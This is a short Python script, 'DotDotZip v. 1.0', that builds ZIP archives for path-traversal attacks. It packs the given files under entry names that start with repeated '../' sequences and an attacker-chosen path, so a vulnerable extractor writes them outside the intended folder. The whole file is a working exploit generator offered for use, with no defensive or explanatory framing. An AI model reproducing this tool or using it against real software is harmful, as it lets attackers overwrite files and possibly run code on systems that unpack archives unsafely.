from zipfile import ZipFile
from argparse import ArgumentParser

def main():
    parser = ArgumentParser(description="DotDotZip v. 1.0")
    
    parser.add_argument("--traverse-count", type=int, default=5, help="Number of '../' sequences to prepend")
    parser.add_argument("--zip-name", type=str, required=True, help="Name of the output ZIP archive")
    parser.add_argument("--prepend-path", type=str, required=True, help="Extra path to prepend")
    parser.add_argument("--pack-files", type=str, nargs='+', required=True, help="Names of files to pack")
    
    args = parser.parse_args()
    
    traverse_str = '../'*args.traverse_count
    
    with ZipFile(args.zip_name, 'w') as zf:
        for file_name in args.pack_files:
            try:
                zf.write(file_name, arcname=f"{traverse_str}{args.prepend_path}{file_name}")
            except FileNotFoundError:
                print(f"Error: The file '{file_name}' does not exist.")

if __name__ == '__main__':
    main()